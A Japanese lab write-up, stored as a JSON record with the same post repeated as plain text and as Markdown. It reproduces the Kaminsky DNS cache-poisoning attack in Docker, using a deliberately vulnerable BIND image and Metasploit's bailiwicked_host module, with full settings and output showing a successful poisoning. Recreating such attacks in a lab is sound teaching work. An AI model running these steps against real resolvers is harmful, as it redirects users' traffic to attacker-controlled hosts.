{"context": "\u4ee5\u4e0b\u306e\u8a18\u4e8b\u3067Kaminsky Attack\u3092\u8a66\u3057\u305f\u306e\u3067\u3059\u304c\u3001VM\u4e0a\u3067Docker\u3092\u7acb\u3066\u3066\u9762\u5012\u3060\u3063\u305f\u306e\u3067Docker\u306e\u307f\u3067\u3084\u308b\u65b9\u6cd5\u3092\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\n\u3053\u3053\u3067\u306f\u8a73\u7d30\u3092\u7701\u3044\u3066\u66f8\u3044\u3066\u3044\u308b\u306e\u3067\u8a73\u7d30\u304c\u77e5\u308a\u305f\u3044\u65b9\u306f\u4ee5\u4e0b\u3002\nhttp://qiita.com/knqyf263/items/b086bbfa391181ffa578\n\n\u74b0\u5883\n\u5168\u3066Docker\u3067\u3084\u308a\u307e\u3057\u305f\u3002\nIP\u30a2\u30c9\u30ec\u30b9\u66f8\u304d\u307e\u3057\u305f\u304c\u3001\u56fa\u5b9a\u3068\u304b\u3057\u3066\u306a\u3044\u306e\u3067\u4ee5\u4e0b\u306b\u306a\u3063\u305f\u306e\u306f\u5076\u7136\u3067\u3059\u3002\n\u3082\u3057\u4ed6\u306b\u5b9f\u9a13\u3057\u305f\u3044\u65b9\u304c\u3044\u308c\u3070\u5404\u81ea\u5909\u66f4\u3057\u3066\u4e0b\u3055\u3044\u3002\n\nOS\n\n\nOS X 10.11.6\n\n\nDocker for Mac\n\n\n1.12.6\n\n\n\u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\n\n172.17.0.2\n\n\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\n\n172.17.0.3\n\n\n\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\n\n172.17.0.4\n\n\n\n\n\u5b9f\u9a13\n\u4ee5\u4e0b\u306f\u5168\u3066Docker for Mac\u3067\u3084\u3063\u3066\u3044\u307e\u3059\u3002\n\n\u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\n\u8a2d\u5b9a\u30d5\u30a1\u30a4\u30eb\ntinydns\u306eDocker\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\u307e\u305a\u3001Mac\u4e0a\u3067tinydns.data\u3092\u7528\u610f\u3057\u307e\u3059\u3002\n$ touch axfrdns.tcp\n\n\nDocker\u30b3\u30f3\u30c6\u30ca\u8d77\u52d5\n\u6e96\u5099\u304c\u3067\u304d\u305f\u306e\u3067\u4ee5\u4e0b\u3067\u8d77\u52d5\u3057\u307e\u3059\u3002\ntinydns\u306e\u8d77\u52d5\u306e\u305f\u3081\u306b\u306ftinydns.data\u304c\u5fc5\u8981\u306a\u306e\u3067\u81ea\u5206\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u5909\u66f4\u3057\u3066\u4f5c\u6210\u3057\u307e\u3059\u3002\n$ docker run --privileged --name tinydns --rm -it -v `pwd`:/data skurtzemann/tinydns bash\nroot@c955ccb16b76:/# ip a\nroot@c955ccb16b76:/# vim /data/tinydns.data\n.:172.17.0.4:ns.toor.tss:518400\n.example.com: 172.17.0.4:ns.example.com:3600\n+www.example.com:192.168.33.100\n\n\u4eca\u56de\u306f\u81ea\u5206\u306e\u30a2\u30c9\u30ec\u30b9\u304c172.17.0.4\u3060\u3063\u305f\u306e\u3067\u5909\u66f4\u3057\u307e\u3059\u3002\n\n\u9045\u5ef6\u306e\u8a2d\u5b9a\n200ms\u306e\u9045\u5ef6\u3092\u5165\u308c\u307e\u3059\u3002\nroot@c955ccb16b76:/# tc qdisc add dev eth0 root netem delay 200ms\n\n\ntinydns\u306e\u8d77\u52d5\ninit.sh\u3067tinydns\u304c\u8d77\u52d5\u3057\u307e\u3059\u3002\nroot@c955ccb16b76:/# ./init.sh\nBuilding tinydns data\n/usr/bin/tinydns-data\nBuilding axfrdns tcp file\ntcprules tcp.cdb tcp.tmp < tcp\nStarting tinydns and axfrdns (svscan)\n\ntinydns\u306e\u8a2d\u5b9a\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\n\u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\u4ee5\u4e0b\u306b\u8106\u5f31\u306aBIND\u306eDockerfile\u3092\u7f6e\u3044\u3066\u3042\u308b\u306e\u3067\u3053\u308c\u3092\u4f7f\u3044\u307e\u3059\u3002\nhttps://github.com/knqyf263/docker-kaminsky\n\u8d77\u52d5\u5f8c\u306bcache.db\u3092\u5148\u7a0b\u306etinydns\u306eIP\u30a2\u30c9\u30ec\u30b9\u306b\u5909\u66f4\u3057\u307e\u3059\u3002\n\u5909\u66f4\u3067\u304d\u305f\u3089BIND\u3092\u8d77\u52d5\u3057\u307e\u3059\u3002running\u3068\u51fa\u3066\u3044\u308c\u3070\u5927\u4e08\u592b\u3067\u3059\u3002\n# docker run --rm --name bind -it knqyf263/docker-kaminsky bash\n[root@9bf6f2888d1a /]# vim /etc/cache.db\n.                        3600000      NS    A.ROOT-SERVERS.NET.\nA.ROOT-SERVERS.NET.      3600000      A     172.17.0.4\n[root@9bf6f2888d1a /]# /var/named/chroot/sbin/named -g -t /var/named/chroot -c /etc/named.conf\n...\n17-Jan-2017 04:13:01.865 running\n\n\n\u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\nKali Linux\u306e\u516c\u5f0fDocker\u30a4\u30e1\u30fc\u30b8\u3092\u4f7f\u3044\u307e\u3059\u3002\n\u8d77\u52d5\u3057\u305f\u3089Metasploit Framework\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n$ docker run --rm -t -i kalilinux/kali-linux-docker /bin/bash\nroot@20fd9d5decee:/# apt-get update\nroot@20fd9d5decee:/# apt-get install metasploit-framework\n\n\n\u30c6\u30b9\u30c8\n\u6b63\u3057\u304fexample.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u304c\u5f15\u3051\u308b\u304b\u78ba\u8a8d\u3057\u3066\u307f\u307e\u3059\u3002\ndocker exec\u306a\u3069\u3067BIND\u306e\u30b3\u30f3\u30c6\u30ca\u306b\u5165\u308a\u3001\u540d\u524d\u89e3\u6c7a\u3057\u3066\u307f\u307e\u3059\u3002\n$ docker exec -it bind bash\n[root@9bf6f2888d1a /]# dig @127.0.0.1 ns example.com\n\n; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 <<>> @127.0.0.1 ns example.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12159\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; QUESTION SECTION:\n;example.com.                   IN      NS\n\n;; ANSWER SECTION:\nexample.com.            3598    IN      NS      ns.example.com.\n\n;; ADDITIONAL SECTION:\nns.example.com.         3598    IN      A       172.17.0.4\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Jan 17 04:17:44 2017\n;; MSG SIZE  rcvd: 62\n\n\u6b63\u3057\u304f\u5f15\u3051\u3066\u3044\u308b\u3088\u3046\u3067\u3059\u3002\n\n\u653b\u6483\u3059\u308b\nmsfconsole\u3092\u8d77\u52d5\u3057\u305f\u3042\u3068\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u5229\u7528\u3057\u307e\u3059\u3002\nroot@20fd9d5decee:/# msfconsole\nmsf > use auxiliary/spoof/dns/bailiwicked_host\nmsf auxiliary(bailiwicked_host) >\n\n\u9069\u5207\u306b\u30aa\u30d7\u30b7\u30e7\u30f3\u3092\u8a2d\u5b9a\u3057\u307e\u3059\u3002\nmsf auxiliary(bailiwicked_host) > set RHOST 172.17.0.3\nRHOST => 172.17.0.3\nmsf auxiliary(bailiwicked_host) > set SRCPORT 10000\nSRCPORT => 10000\nmsf auxiliary(bailiwicked_host) > set HOSTNAME www.example.com\nHOSTNAME => www.example.com\nmsf auxiliary(bailiwicked_host) > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(bailiwicked_host) > set RECONS 172.17.0.4\nRECONS => 172.17.0.4\n\n\u5b9f\u884c\u3057\u307e\u3059\u3002\nmsf auxiliary(bailiwicked_host) > run\n\n[*] Targeting nameserver 172.17.0.3 for injection of www.example.com. as 1.3.3.7\n[*] Querying recon nameserver for example.com.'s nameservers...\n[*]  Got an NS record: example.com.            259200  IN      NS      3600.ns.example.com.\n[*]   Querying recon nameserver for address of 3600.ns.example.com....\n[*]    Got an A record: 3600.ns.example.com.    259200  IN      A       172.17.0.4\n[*]     Checking Authoritativeness: Querying 172.17.0.4 for example.com....\n[*]     3600.ns.example.com. is authoritative for example.com., adding to list of nameservers to spoof as\n[*] Calculating the number of spoofed replies to send per query...\n[*]   race calc: 100 queries | min/max/avg time: 0.2/0.38/0.2 | min/max/avg replies: 63/596/463\n[*] Sending 694 spoofed replies from each nameserver (1) for each query\nSIOCSIFFLAGS: Operation not permitted\n[*] Attempting to inject a poison record for www.example.com. into 172.17.0.3:10000...\n[*] Poisoning successful after 250 queries and 173500 responses: www.example.com == 1.3.3.7\n[*] TTL: 43618 DATA: #<Resolv::DNS::Resource::IN::A:0x00561a9d862168>\n[*] Auxiliary module execution completed\n\n\u6210\u529f\u3057\u305f\u3068\u51fa\u305f\u306e\u3067\u3001BIND\u4e0a\u3067\u540d\u524d\u3092\u5f15\u3044\u3066\u307f\u308b\u3068\u78ba\u304b\u306b\u6c5a\u67d3\u3055\u308c\u3066\u3044\u307e\u3059\u3002\n[root@9bf6f2888d1a /]# dig @127.0.0.1 www.example.com +short\n1.3.3.7\n\n\n\u307e\u3068\u3081\n\u6700\u521d\u304b\u3089Docker\u3067\u3084\u308c\u3070\u3088\u304b\u3063\u305f\u3002\n\u4ee5\u4e0b\u306e\u8a18\u4e8b\u3067Kaminsky Attack\u3092\u8a66\u3057\u305f\u306e\u3067\u3059\u304c\u3001VM\u4e0a\u3067Docker\u3092\u7acb\u3066\u3066\u9762\u5012\u3060\u3063\u305f\u306e\u3067Docker\u306e\u307f\u3067\u3084\u308b\u65b9\u6cd5\u3092\u8a66\u3057\u3066\u307f\u307e\u3057\u305f\u3002\n\u3053\u3053\u3067\u306f\u8a73\u7d30\u3092\u7701\u3044\u3066\u66f8\u3044\u3066\u3044\u308b\u306e\u3067\u8a73\u7d30\u304c\u77e5\u308a\u305f\u3044\u65b9\u306f\u4ee5\u4e0b\u3002\nhttp://qiita.com/knqyf263/items/b086bbfa391181ffa578\n\n#\u74b0\u5883\n\u5168\u3066Docker\u3067\u3084\u308a\u307e\u3057\u305f\u3002\nIP\u30a2\u30c9\u30ec\u30b9\u66f8\u304d\u307e\u3057\u305f\u304c\u3001\u56fa\u5b9a\u3068\u304b\u3057\u3066\u306a\u3044\u306e\u3067\u4ee5\u4e0b\u306b\u306a\u3063\u305f\u306e\u306f\u5076\u7136\u3067\u3059\u3002\n\u3082\u3057\u4ed6\u306b\u5b9f\u9a13\u3057\u305f\u3044\u65b9\u304c\u3044\u308c\u3070\u5404\u81ea\u5909\u66f4\u3057\u3066\u4e0b\u3055\u3044\u3002\n\n- OS\n\t- OS X 10.11.6\n- Docker for Mac\n\t- 1.12.6\n- \u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\n\t- 172.17.0.2\n- \u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\t- 172.17.0.3\n- \u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\t- 172.17.0.4\n\n#\u5b9f\u9a13\n\u4ee5\u4e0b\u306f\u5168\u3066Docker for Mac\u3067\u3084\u3063\u3066\u3044\u307e\u3059\u3002\n\n## \u30eb\u30fc\u30c8\u30b5\u30fc\u30d0 \u517c example.nom\u6a29\u5a01\u30b5\u30fc\u30d0\uff08tinydns\uff09\n\n### \u8a2d\u5b9a\u30d5\u30a1\u30a4\u30eb\ntinydns\u306eDocker\u30a4\u30e1\u30fc\u30b8\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\u307e\u305a\u3001Mac\u4e0a\u3067tinydns.data\u3092\u7528\u610f\u3057\u307e\u3059\u3002\n\n```\n$ touch axfrdns.tcp\n```\n\n### Docker\u30b3\u30f3\u30c6\u30ca\u8d77\u52d5\n\n\u6e96\u5099\u304c\u3067\u304d\u305f\u306e\u3067\u4ee5\u4e0b\u3067\u8d77\u52d5\u3057\u307e\u3059\u3002\ntinydns\u306e\u8d77\u52d5\u306e\u305f\u3081\u306b\u306ftinydns.data\u304c\u5fc5\u8981\u306a\u306e\u3067\u81ea\u5206\u306e\u30a2\u30c9\u30ec\u30b9\u306b\u5909\u66f4\u3057\u3066\u4f5c\u6210\u3057\u307e\u3059\u3002\n\n```\n$ docker run --privileged --name tinydns --rm -it -v `pwd`:/data skurtzemann/tinydns bash\nroot@c955ccb16b76:/# ip a\nroot@c955ccb16b76:/# vim /data/tinydns.data\n.:172.17.0.4:ns.toor.tss:518400\n.example.com: 172.17.0.4:ns.example.com:3600\n+www.example.com:192.168.33.100\n```\n\n\u4eca\u56de\u306f\u81ea\u5206\u306e\u30a2\u30c9\u30ec\u30b9\u304c172.17.0.4\u3060\u3063\u305f\u306e\u3067\u5909\u66f4\u3057\u307e\u3059\u3002\n\n### \u9045\u5ef6\u306e\u8a2d\u5b9a\n200ms\u306e\u9045\u5ef6\u3092\u5165\u308c\u307e\u3059\u3002\n\n```\nroot@c955ccb16b76:/# tc qdisc add dev eth0 root netem delay 200ms\n```\n\n### tinydns\u306e\u8d77\u52d5\ninit.sh\u3067tinydns\u304c\u8d77\u52d5\u3057\u307e\u3059\u3002\n\n```\nroot@c955ccb16b76:/# ./init.sh\nBuilding tinydns data\n/usr/bin/tinydns-data\nBuilding axfrdns tcp file\ntcprules tcp.cdb tcp.tmp < tcp\nStarting tinydns and axfrdns (svscan)\n```\n\ntinydns\u306e\u8a2d\u5b9a\u306f\u5b8c\u4e86\u3067\u3059\u3002\n\n## \u88ab\u653b\u6483\u30ad\u30e3\u30c3\u30b7\u30e5\u30b5\u30fc\u30d0\uff08BIND\uff09\n\u4ee5\u4e0b\u306b\u8106\u5f31\u306aBIND\u306eDockerfile\u3092\u7f6e\u3044\u3066\u3042\u308b\u306e\u3067\u3053\u308c\u3092\u4f7f\u3044\u307e\u3059\u3002\nhttps://github.com/knqyf263/docker-kaminsky\n\n\u8d77\u52d5\u5f8c\u306bcache.db\u3092\u5148\u7a0b\u306etinydns\u306eIP\u30a2\u30c9\u30ec\u30b9\u306b\u5909\u66f4\u3057\u307e\u3059\u3002\n\u5909\u66f4\u3067\u304d\u305f\u3089BIND\u3092\u8d77\u52d5\u3057\u307e\u3059\u3002running\u3068\u51fa\u3066\u3044\u308c\u3070\u5927\u4e08\u592b\u3067\u3059\u3002\n\n```\n# docker run --rm --name bind -it knqyf263/docker-kaminsky bash\n[root@9bf6f2888d1a /]# vim /etc/cache.db\n.                        3600000      NS    A.ROOT-SERVERS.NET.\nA.ROOT-SERVERS.NET.      3600000      A     172.17.0.4\n[root@9bf6f2888d1a /]# /var/named/chroot/sbin/named -g -t /var/named/chroot -c /etc/named.conf\n...\n17-Jan-2017 04:13:01.865 running\n```\n\n## \u653b\u6483\u8005\u30b5\u30fc\u30d0\uff08Metasploit Framework)\nKali Linux\u306e\u516c\u5f0fDocker\u30a4\u30e1\u30fc\u30b8\u3092\u4f7f\u3044\u307e\u3059\u3002\n\u8d77\u52d5\u3057\u305f\u3089Metasploit Framework\u3092\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3057\u307e\u3059\u3002\n\n```\n$ docker run --rm -t -i kalilinux/kali-linux-docker /bin/bash\nroot@20fd9d5decee:/# apt-get update\nroot@20fd9d5decee:/# apt-get install metasploit-framework\n```\n\n## \u30c6\u30b9\u30c8\n\u6b63\u3057\u304fexample.com\u306eNS\u30ec\u30b3\u30fc\u30c9\u304c\u5f15\u3051\u308b\u304b\u78ba\u8a8d\u3057\u3066\u307f\u307e\u3059\u3002\ndocker exec\u306a\u3069\u3067BIND\u306e\u30b3\u30f3\u30c6\u30ca\u306b\u5165\u308a\u3001\u540d\u524d\u89e3\u6c7a\u3057\u3066\u307f\u307e\u3059\u3002\n\n```\n$ docker exec -it bind bash\n[root@9bf6f2888d1a /]# dig @127.0.0.1 ns example.com\n\n; <<>> DiG 9.8.2rc1-RedHat-9.8.2-0.47.rc1.el6_8.3 <<>> @127.0.0.1 ns example.com\n; (1 server found)\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12159\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; QUESTION SECTION:\n;example.com.                   IN      NS\n\n;; ANSWER SECTION:\nexample.com.            3598    IN      NS      ns.example.com.\n\n;; ADDITIONAL SECTION:\nns.example.com.         3598    IN      A       172.17.0.4\n\n;; Query time: 0 msec\n;; SERVER: 127.0.0.1#53(127.0.0.1)\n;; WHEN: Tue Jan 17 04:17:44 2017\n;; MSG SIZE  rcvd: 62\n```\n\n\u6b63\u3057\u304f\u5f15\u3051\u3066\u3044\u308b\u3088\u3046\u3067\u3059\u3002\n\n## \u653b\u6483\u3059\u308b\nmsfconsole\u3092\u8d77\u52d5\u3057\u305f\u3042\u3068\u3001bailiwicked_host\u30e2\u30b8\u30e5\u30fc\u30eb\u3092\u5229\u7528\u3057\u307e\u3059\u3002\n\n```\nroot@20fd9d5decee:/# msfconsole\nmsf > use auxiliary/spoof/dns/bailiwicked_host\nmsf auxiliary(bailiwicked_host) >\n```\n\n\u9069\u5207\u306b\u30aa\u30d7\u30b7\u30e7\u30f3\u3092\u8a2d\u5b9a\u3057\u307e\u3059\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > set RHOST 172.17.0.3\nRHOST => 172.17.0.3\nmsf auxiliary(bailiwicked_host) > set SRCPORT 10000\nSRCPORT => 10000\nmsf auxiliary(bailiwicked_host) > set HOSTNAME www.example.com\nHOSTNAME => www.example.com\nmsf auxiliary(bailiwicked_host) > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(bailiwicked_host) > set RECONS 172.17.0.4\nRECONS => 172.17.0.4\n```\n\n\u5b9f\u884c\u3057\u307e\u3059\u3002\n\n```\nmsf auxiliary(bailiwicked_host) > run\n\n[*] Targeting nameserver 172.17.0.3 for injection of www.example.com. as 1.3.3.7\n[*] Querying recon nameserver for example.com.'s nameservers...\n[*]  Got an NS record: example.com.            259200  IN      NS      3600.ns.example.com.\n[*]   Querying recon nameserver for address of 3600.ns.example.com....\n[*]    Got an A record: 3600.ns.example.com.    259200  IN      A       172.17.0.4\n[*]     Checking Authoritativeness: Querying 172.17.0.4 for example.com....\n[*]     3600.ns.example.com. is authoritative for example.com., adding to list of nameservers to spoof as\n[*] Calculating the number of spoofed replies to send per query...\n[*]   race calc: 100 queries | min/max/avg time: 0.2/0.38/0.2 | min/max/avg replies: 63/596/463\n[*] Sending 694 spoofed replies from each nameserver (1) for each query\nSIOCSIFFLAGS: Operation not permitted\n[*] Attempting to inject a poison record for www.example.com. into 172.17.0.3:10000...\n[*] Poisoning successful after 250 queries and 173500 responses: www.example.com == 1.3.3.7\n[*] TTL: 43618 DATA: #<Resolv::DNS::Resource::IN::A:0x00561a9d862168>\n[*] Auxiliary module execution completed\n```\n\n\u6210\u529f\u3057\u305f\u3068\u51fa\u305f\u306e\u3067\u3001BIND\u4e0a\u3067\u540d\u524d\u3092\u5f15\u3044\u3066\u307f\u308b\u3068\u78ba\u304b\u306b\u6c5a\u67d3\u3055\u308c\u3066\u3044\u307e\u3059\u3002\n\n```\n[root@9bf6f2888d1a /]# dig @127.0.0.1 www.example.com +short\n1.3.3.7\n```\n\n# \u307e\u3068\u3081\n\u6700\u521d\u304b\u3089Docker\u3067\u3084\u308c\u3070\u3088\u304b\u3063\u305f\u3002\n\n", "tags": ["KaliLinux", "bind", "dns", "docker", "metasploit"]}